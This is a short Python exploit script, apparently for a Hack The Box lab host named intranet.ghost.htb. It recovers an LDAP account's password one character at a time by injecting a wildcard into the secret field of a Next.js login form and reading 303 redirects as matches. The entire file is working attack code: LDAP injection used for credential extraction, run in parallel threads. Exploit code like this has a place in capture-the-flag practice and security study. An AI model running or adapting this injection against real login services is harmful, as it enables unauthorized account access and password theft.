import string
import requests
from concurrent.futures import ThreadPoolExecutor
from pwn import *

url = 'http://intranet.ghost.htb:8008/login'
bar = log.progress("Bruteforcing password")

headers = {
    'Host': 'intranet.ghost.htb:8008',
    'Accept-Language': 'en-US,en;q=0.5',
    'Next-Router-State-Tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22login%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
    'Next-Action': 'c471eb076ccac91d6f828b671795550fd5925940',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive'
}

password = ""
session = requests.Session()

def try_char(char):
    global password
    files = {
        '1_ldap-username': (None, 'gitea_temp_principal'),
        '1_ldap-secret': (None, f'{password}{char}*'),
        '0': (None, '[{},"$K1"]')
    }
    try:
        res = session.post(url, headers=headers, files=files, timeout=5)
        if res.status_code == 303:
            password += char
            bar.status(f"Found character: {char}, current password: {password}")
            return True
    except requests.RequestException as e:
        bar.status(f"Error: {e}")
    return False

while True:
    with ThreadPoolExecutor(max_workers=10) as executor:
        results = list(executor.map(try_char, string.ascii_lowercase + string.digits))
    
    if not any(results):
        break

bar.success(f"The final password is {password}")
